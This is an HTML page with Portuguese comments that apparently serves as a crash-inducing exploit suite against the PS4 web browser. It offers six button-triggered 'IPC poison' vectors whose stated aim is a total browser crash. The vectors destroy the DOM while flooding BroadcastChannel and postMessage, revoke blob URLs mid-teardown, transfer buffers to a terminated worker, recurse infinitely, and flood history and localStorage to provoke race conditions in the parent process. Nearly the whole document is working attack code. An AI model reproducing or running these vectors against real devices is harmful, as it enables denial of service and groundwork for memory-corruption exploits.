<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 Suite v250000: IPC Poison</title>
<style>
    body { background: #000; color: #fff; font-family: monospace; text-align: center; padding: 10px; }
    h1 { color: #f0f; border-bottom: 2px solid #f0f; }
    .status { border: 1px solid #f0f; padding: 10px; margin-bottom: 20px; color: #f0f; }
    
    button {
        display: block; width: 100%; padding: 20px; margin: 10px 0;
        background: #202; color: #fff; border: 2px solid #f0f;
        font-size: 18px; font-weight: bold; cursor: pointer; text-transform: uppercase;
    }
    button:hover { background: #f0f; color: #000; }
    
    #stage { background: #222; width: 100%; height: 50px; margin-top: 10px; border: 1px solid #555; }
</style>
</head>
<body>

<h1>v250000: IPC POISON (BROWSER KILLER)</h1>

<div class="status">
    OBJETIVO: CRASH TOTAL (ERRO CE-34878-0)<br>
    CLIQUE -> FULLSCREEN (QUADRADO) -> FECHE ALERTA
</div>

<button onclick="poison(ipc01)">01. Body Kill + MessagePort Entangle (White Screen Fix)</button>
<button onclick="poison(ipc02)">02. Fragment Replace + Blob URL Revoke (White Screen Fix)</button>
<button onclick="poison(ipc03)">03. The Combo + Worker Transfer (White Screen Fix)</button>

<button onclick="poison(ipc04)">04. Stack Smash + Broadcast Storm (Black Screen Fix)</button>
<button onclick="poison(ipc05)">05. History Flood + LocalStorage Sync (Black Screen Fix)</button>

<button onclick="poison(ipc06)">06. Fullscreen -> Alert -> Print() (Native IPC)</button>

<div id="stage">ALVO</div>

<script>
    const Stage = document.getElementById('stage');

    function poison(vectorFunc) {
        Stage.innerHTML = "";
        
        // 1. Configura o alvo
        const target = vectorFunc(Stage);

        // 2. Solicita Fullscreen
        if (target.webkitRequestFullscreen) target.webkitRequestFullscreen();
        else if (target.requestFullscreen) target.requestFullscreen();

        // 3. Timing Otimizado com IPC Flood
        requestAnimationFrame(() => {
            setTimeout(() => {
                // Inicia o tráfego IPC ANTES do alerta para aquecer os pipes
                if(target._ipcStart) target._ipcStart();

                window.alert("⚠️ IPC ARMED ⚠️\n\nAo fechar, enviaremos lixo para o Processo Pai.");

                // Detonação
                if(target._detonate) {
                    target._detonate();
                    // Onde a mágica acontece: Spray de memória + Flood de mensagens
                    // enquanto o processo morre.
                    ipc_flood(); 
                }
            }, 50);
        });
    }

    // Ferramenta: Envia mensagens lixo para tentar corromper o processo pai
    function ipc_flood() {
        try {
            const bc = new BroadcastChannel("killer");
            const ab = new ArrayBuffer(1024);
            // Envia mensagens furiosamente
            for(let i=0; i<1000; i++) {
                bc.postMessage(ab); // Tenta clonar memória num processo moribundo
                window.postMessage("die", "*");
            }
        } catch(e) {}
    }

    // =================================================================
    // 01. Body Kill + MessagePort (Baseado no Teste 1)
    // Tela Branca -> Tenta corromper a porta de comunicação ao morrer.
    // =================================================================
    function ipc01(stage) {
        const d = document.createElement('div');
        d.innerHTML = "<h1>PORT KILLER</h1>";
        d.style.background = "red";
        stage.appendChild(d);
        
        let channel = new MessageChannel();
        let port = channel.port1;

        d._ipcStart = () => {
            // Cria uma cadeia de portas
            channel = new MessageChannel();
            port = channel.port1;
        };

        d._detonate = () => {
            // Destroi o Body
            document.body.innerHTML = "";
            document.body.remove();
            
            // Tenta transferir a porta para si mesmo num loop fechado
            // O navegador tenta serializar a porta enquanto o DOM morre
            window.postMessage("crash", "*", [channel.port2]);
        };
        return d;
    }

    // =================================================================
    // 02. Fragment Replace + Blob Revoke (Baseado no Teste 7)
    // Tela Branca -> Corrupção de VFS IPC
    // =================================================================
    function ipc02(stage) {
        const d = document.createElement('div');
        d.innerText = "BLOB KILLER";
        stage.appendChild(d);

        let url = "";

        d._ipcStart = () => {
            // Cria um Blob grande (IPC com processo de Rede/Storage)
            const b = new Blob([new Uint8Array(1024*1024).fill(0x41)]);
            url = URL.createObjectURL(b);
        };

        d._detonate = () => {
            // Substitui o root
            const frag = document.createDocumentFragment();
            document.documentElement.replaceChild(frag, document.body);
            
            // Revoga a URL enquanto o processo morre. 
            // O processo pai pode tentar acessar o blob órfão.
            URL.revokeObjectURL(url);
            window.open(url); // Tenta abrir a URL morta
        };
        return d;
    }

    // =================================================================
    // 03. The Combo + Worker Transfer (Baseado no Teste 5)
    // Tela Branca -> Corrupção de Thread IPC
    // =================================================================
    function ipc03(stage) {
        const d = document.createElement('div');
        d.innerHTML = "<h1>WORKER KILLER</h1>";
        d.style.background = "purple";
        stage.appendChild(d);

        let w = null;
        let ab = new ArrayBuffer(1024*1024); // 1MB

        d._ipcStart = () => {
            w = new Worker(URL.createObjectURL(new Blob(["onmessage=()=>{}"],{type:'text/javascript'})));
        };

        d._detonate = () => {
            // Combo Destruction
            document.body.innerHTML = "";
            document.body.remove();
            
            // Transfere memória para o worker no momento da morte
            // Se o Garbage Collector rodar aqui, ele se perde entre threads
            w.postMessage(ab, [ab]);
            w.terminate(); // Mata o worker simultaneamente
        };
        return d;
    }

    // =================================================================
    // 04. Stack Smash + Broadcast Storm (Baseado no Teste 2)
    // Tela Preta -> Corrupção de Event Loop IPC
    // =================================================================
    function ipc04(stage) {
        const d = document.createElement('div');
        d.innerText = "STACK STORM";
        stage.appendChild(d);

        let bc = new BroadcastChannel("storm");

        d._ipcStart = () => {
            // Enche a fila de mensagens
            for(let i=0; i<100; i++) bc.postMessage("flood");
        };

        d._detonate = () => {
            // Stack Smash
            function die() { die(); }
            
            // Envia mensagens assíncronas que serão processadas durante o travamento
            setInterval(() => {
                bc.postMessage(new ArrayBuffer(100));
            }, 1);

            die(); // Trava a CPU
        };
        return d;
    }

    // =================================================================
    // 05. History Flood + Storage Sync (Baseado no Teste 3)
    // Tela Preta -> Corrupção de Storage IPC
    // =================================================================
    function ipc05(stage) {
        const d = document.createElement('div');
        d.innerText = "STORAGE BOMB";
        stage.appendChild(d);

        d._ipcStart = () => {
            localStorage.clear();
        };

        d._detonate = () => {
            // Dispara evento de Storage (IPC sincrono/assincrono complexo)
            // Enquanto inunda o histórico
            for(let i=0; i<500; i++) {
                history.pushState({}, "", "crash"+i);
                localStorage.setItem("k"+i, "A".repeat(1000));
            }
            history.go(-200);
            localStorage.clear(); // Race condition no disco
        };
        return d;
    }

    // =================================================================
    // 06. Fullscreen -> Alert -> Print (NOVO - NATIVE IPC)
    // Tenta abrir a janela de impressão nativa (que usa IPC pesado)
    // durante o crash.
    // =================================================================
    function ipc06(stage) {
        const d = document.createElement('div');
        d.innerText = "PRINT KILLER";
        stage.appendChild(d);

        d._detonate = () => {
            document.body.innerHTML = ""; // Nuke
            
            // Tenta invocar janela nativa de impressão
            // No PS4 isso geralmente falha, mas a tentativa de IPC pode crashar
            // se o renderizador já estiver morto.
            window.print(); 
        };
        return d;
    }

</script>
</body>
</html>
